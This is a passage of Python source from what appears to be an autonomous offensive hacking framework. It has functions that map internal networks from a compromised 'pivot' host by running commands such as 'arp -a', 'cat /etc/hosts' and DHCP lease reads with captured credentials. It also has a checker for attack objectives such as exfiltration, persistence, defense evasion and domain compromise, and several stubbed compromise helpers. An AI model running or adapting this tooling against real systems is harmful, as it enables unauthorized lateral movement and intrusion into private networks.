        if k8s_result.get("k8s_accessible"):
            opportunities.append(
                {
                    "type": "kubernetes_access",
                    "pivot_method": "k8s_pod_exploitation",
                    "confidence": 0.75,
                }
            )

    except Exception:
        # Don't fail the whole operation on lateral movement check failure
        pass

    return opportunities


def _discover_internal_networks(host_ip: str, credentials: dict) -> list[str]:
    """
    Discover internal networks accessible from compromised pivot point.

    Uses multiple techniques to discover internal networks:
    - ARP cache analysis
    - Routing table examination
    - Network interface enumeration
    - Subnet scanning via pivot
    - DHCP leases examination

    Args:
        host_ip: IP of pivot/compromised host
        credentials: Access credentials (ssh keys, passwords, etc.)

    Returns:
        List of discovered internal network CIDRs
    """
    discovered_networks = []

    try:
        # Method 1: Analyze routing table
        from kryon.tools.reconnaissance import netstat

        routing_result = netstat.get_routing_table(host_ip)

        if routing_result.get("routes"):
            for route in routing_result["routes"]:
                destination = route.get("destination", "")

                # Add private network ranges found in routes
                if any(
                    destination.startswith(prefix)
                    for prefix in [
                        "10.",
                        "172.16.",
                        "172.17.",
                        "172.18.",
                        "172.19.",
                        "172.20.",
                        "172.21.",
                        "172.22.",
                        "172.23.",
                        "172.24.",
                        "172.25.",
                        "172.26.",
                        "172.27.",
                        "172.28.",
                        "172.29.",
                        "172.30.",
                        "172.31.",
                        "192.168.",
                    ]
                ):
                    if "/" in destination and destination not in discovered_networks:
                        discovered_networks.append(destination)

        # Method 2: Enumerate network interfaces
        from kryon.tools.network import capture_traffic

        interfaces_result = capture_traffic.get_network_interfaces(host_ip)

        if interfaces_result.get("interfaces"):
            for interface in interfaces_result["interfaces"]:
                network = interface.get("network")
                if network and network not in discovered_networks:
                    # Verify it's a private network
                    ip_part = network.split("/")[0]
                    if any(
                        ip_part.startswith(prefix)
                        for prefix in [
                            "10.",
                            "172.16.",
                            "172.17.",
                            "172.18.",
                            "172.19.",
                            "172.20.",
                            "172.21.",
                            "172.22.",
                            "172.23.",
                            "172.24.",
                            "172.25.",
                            "172.26.",
                            "172.27.",
                            "172.28.",
                            "172.29.",
                            "172.30.",
                            "172.31.",
                            "192.168.",
                        ]
                    ):
                        discovered_networks.append(network)

        # Method 3: ARP cache analysis
        from kryon.tools.reconnaissance import netcat

        arp_result = netcat.execute_command(host_ip=host_ip, command="arp -a", credentials=credentials)

        if arp_result.get("output"):
            import re

            # Parse ARP output for IP addresses
            ip_pattern = r"(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})"
            arp_ips = re.findall(ip_pattern, arp_result["output"])

            # Derive networks from ARP IPs
            for ip in arp_ips:
                # Assume /24 for now
                network_base = ".".join(ip.split(".")[:3]) + ".0/24"
                if network_base not in discovered_networks:
                    if any(network_base.startswith(prefix) for prefix in ["10.", "172.", "192.168."]):
                        discovered_networks.append(network_base)

        # Method 4: Check for Docker networks
        from kryon.tools.container import docker_bench

        docker_result = docker_bench.list_docker_networks(host_ip)

        if docker_result.get("networks"):
            for network in docker_result["networks"]:
                subnet = network.get("subnet")
                if subnet and subnet not in discovered_networks:
                    discovered_networks.append(subnet)

        # Method 5: Check /etc/hosts and DNS cache for hints
        hosts_result = netcat.execute_command(host_ip=host_ip, command="cat /etc/hosts", credentials=credentials)

        if hosts_result.get("output"):
            # Parse for internal IPs
            for line in hosts_result["output"].split("\n"):
                if not line.strip() or line.startswith("#"):
                    continue

                parts = line.split()
                if len(parts) >= 2:
                    ip = parts[0]
                    # Check if it's a private IP
                    if any(ip.startswith(prefix) for prefix in ["10.", "172.", "192.168."]):
                        network_base = ".".join(ip.split(".")[:3]) + ".0/24"
                        if network_base not in discovered_networks:
                            discovered_networks.append(network_base)

        # Method 6: DHCP leases (Linux)
        dhcp_result = netcat.execute_command(
            host_ip=host_ip,
            command="cat /var/lib/dhcp/dhclient.leases 2>/dev/null || cat /var/lib/dhclient/dhclient.leases 2>/dev/null",
            credentials=credentials,
        )

        if dhcp_result.get("output"):
            # Parse DHCP leases for subnet information
            import re

            subnet_pattern = r"option subnet-mask (\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})"
            router_pattern = r"option routers (\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})"

            re.findall(subnet_pattern, dhcp_result["output"])
            routers = re.findall(router_pattern, dhcp_result["output"])

            # Combine router IPs with common /24 assumption
            for router in routers:
                network_base = ".".join(router.split(".")[:3]) + ".0/24"
                if network_base not in discovered_networks:
                    discovered_networks.append(network_base)

        # Method 7: Windows-specific - Check network connections
        if credentials.get("platform") == "windows":
            netstat_result = netcat.execute_command(host_ip=host_ip, command="netstat -rn", credentials=credentials)

            if netstat_result.get("output"):
                # Parse Windows routing table
                import re

                for line in netstat_result["output"].split("\n"):
                    # Look for network destinations
                    parts = line.split()
                    if len(parts) >= 2:
                        dest = parts[0]
                        if any(dest.startswith(prefix) for prefix in ["10.", "172.", "192.168."]):
                            # Try to include netmask if available
                            if len(parts) >= 3:
                                netmask = parts[1]
                                # Convert netmask to CIDR if possible
                                try:
                                    import ipaddress

                                    cidr = ipaddress.IPv4Network(f"{dest}/{netmask}", strict=False)
                                    if str(cidr) not in discovered_networks:
                                        discovered_networks.append(str(cidr))
                                except Exception:
                                    pass

        # Deduplicate and sort
        discovered_networks = list(set(discovered_networks))
        discovered_networks.sort()

        # If no networks discovered, return common default
        if not discovered_networks:
            # Make educated guess based on pivot IP
            pivot_octets = host_ip.split(".")
            if len(pivot_octets) == 4:
                # Assume same /24 network
                default_network = f"{pivot_octets[0]}.{pivot_octets[1]}.{pivot_octets[2]}.0/24"
                discovered_networks.append(default_network)

    except Exception:
        # Return empty list on failure
        pass

    return discovered_networks


def _enumerate_through_pivot(network: str, socks_proxy: str) -> list[dict]:
    """Enumerate hosts through SOCKS proxy."""
    return []


def _autonomous_compromise_through_pivot(target_ip: str, socks_proxy: str) -> dict[str, Any]:
    """Attempt autonomous compromise through pivot."""
    return {"success": False, "access_level": "none"}


def _check_objective_achieved(objective: str, results: dict) -> bool:
    """
    Check if a specific mission objective has been achieved.

    Validates objective completion based on operation results and gathered evidence.

    Args:
        objective: Objective name (initial_access, privilege_escalation, find_flags, etc.)
        results: Current operation results dictionary

    Returns:
        True if objective is achieved, False otherwise
    """
    objective = objective.lower()

    try:
        # Initial Access objective
        if objective == "initial_access":
            # Check if any service has been successfully exploited
            if results.get("services_exploited") and len(results["services_exploited"]) > 0:
                return True

            # Check if any exploitation was successful
            for step in results.get("exploitation_path", []):
                if step.get("phase") == "exploitation" and step.get("status") == "success":
                    return True

            # Check if we have shell access
            if any(step.get("shell_obtained") for step in results.get("exploitation_path", [])):
                return True

        # Privilege Escalation objective
        elif objective == "privilege_escalation":
            # Check privilege level
            privilege_level = results.get("privilege_level", "none")

            if privilege_level in ["root", "system", "administrator"]:
                return True

            # Check if privesc phase was successful
            for step in results.get("exploitation_path", []):
                if step.get("phase") == "privilege_escalation" and step.get("status") == "success":
                    return True

        # Find Flags objective
        elif objective == "find_flags":
            # Check if any flags were found
            if results.get("flags_found") and len(results["flags_found"]) > 0:
                # Filter out empty flags
                valid_flags = [f for f in results["flags_found"] if f.get("value")]
                return len(valid_flags) > 0

        # Lateral Movement objective
        elif objective == "lateral_movement":
            # Check if lateral movement opportunities were identified
            for step in results.get("exploitation_path", []):
                if step.get("phase") == "lateral_movement":
                    return True

            # Check if any pivoting was successful
            if results.get("pivoted_hosts"):
                return len(results["pivoted_hosts"]) > 0

        # Data Exfiltration objective
        elif objective == "data_exfiltration":
            # Check if any data was exfiltrated
            if results.get("data_exfiltrated"):
                return True

            for step in results.get("exploitation_path", []):
                if step.get("phase") == "exfiltration" and step.get("status") == "success":
                    return True

        # Reconnaissance objective
        elif objective == "reconnaissance":
            # Check if recon was performed
            for step in results.get("exploitation_path", []):
                if step.get("phase") == "reconnaissance" and step.get("status") == "completed":
                    return True

            # Check if services were detected
            if results.get("services_detected") and len(results["services_detected"]) > 0:
                return True

        # Vulnerability Assessment objective
        elif objective == "vulnerability_assessment":
            # Check if vulnerabilities were found
            for step in results.get("exploitation_path", []):
                if step.get("vulnerabilities_found", 0) > 0:
                    return True

        # Persistence objective
        elif objective == "persistence":
            # Check if persistence mechanisms were established
            for step in results.get("exploitation_path", []):
                if step.get("phase") == "persistence" and step.get("status") == "success":
                    return True

            if results.get("persistence_established"):
                return True

        # Credentials Gathering objective
        elif objective == "credentials_gathering":
            # Check if credentials were discovered
            for step in results.get("exploitation_path", []):
                if step.get("phase") == "intelligence" and step.get("status") == "credentials_discovered":
                    return True

            if results.get("credentials_found") and len(results["credentials_found"]) > 0:
                return True

        # Network Mapping objective
        elif objective == "network_mapping":
            # Check if internal networks were discovered
            if results.get("internal_networks") and len(results["internal_networks"]) > 0:
                return True

            for step in results.get("exploitation_path", []):
                if "network_mapping" in step.get("phase", ""):
                    return True

        # Domain Compromise objective
        elif objective == "domain_compromise":
            # Check if domain admin access was achieved
            if results.get("privilege_level") in ["domain_admin", "enterprise_admin"]:
                return True

            if results.get("domain_compromised"):
                return True

        # Defense Evasion objective
        elif objective == "defense_evasion":
            # Check if defenses were successfully evaded
            defenses_bypassed = []
            for step in results.get("exploitation_path", []):
                if step.get("defenses_bypassed"):
                    defenses_bypassed.extend(step["defenses_bypassed"])

            return len(defenses_bypassed) > 0

    except Exception:
        # If there's an error checking, assume objective not achieved
        pass

    return False


def _auto_select_agents(target_ip: str) -> list[str]:
    """Auto-select appropriate agents for target."""
    return ["t600_scout", "t800_infiltrator", "network_analyzer"]


def _run_agent(agent_name: str, target_ip: str) -> dict[str, Any]:
    """Run specific agent."""
    return {"summary": f"Agent {agent_name} completed", "findings": []}


def _synthesize_multi_agent_findings(agent_results: dict) -> list[dict]:
    """Synthesize findings from multiple agents."""
    return []


def _generate_multi_agent_recommendations(results: dict) -> list[str]:
    """Generate recommendations from multi-agent results."""
    return []
